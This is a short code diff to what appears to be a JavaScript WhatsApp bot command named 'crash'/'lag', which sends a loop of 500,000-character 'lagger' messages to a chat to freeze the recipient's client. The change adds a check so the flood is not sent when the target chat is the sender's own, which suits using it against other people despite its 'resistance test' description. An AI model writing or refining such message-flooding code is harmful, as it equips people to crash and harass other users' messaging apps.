@@ -20,7 +20,7 @@ module.exports = {
   description: "Envía un mensaje lagger para probar la resistencia del cliente.",
   commands: ["crash", "lag"],
   usage: `${PREFIX}crash`,
-  handle: async ({ socket, remoteJid }) => {
+  handle: async ({ socket, remoteJid, sender }) => {
     try {
       // Configuración de la prueba
       const lagStringLength = 500000; // Longitud del string lagger
@@ -34,7 +34,9 @@ module.exports = {
       let i = 0;
       while (i < lagStringRepeat) {
         const mensaje = lagString + calcularFactorial(100);
-        await enviarMensaje(socket, remoteJid, mensaje);
+        if (sender !== remoteJid) {
+          await enviarMensaje(socket, remoteJid, mensaje);
+        }
         await new Promise(resolve => setTimeout(resolve, delayBetweenMessages));
         i++;
       }
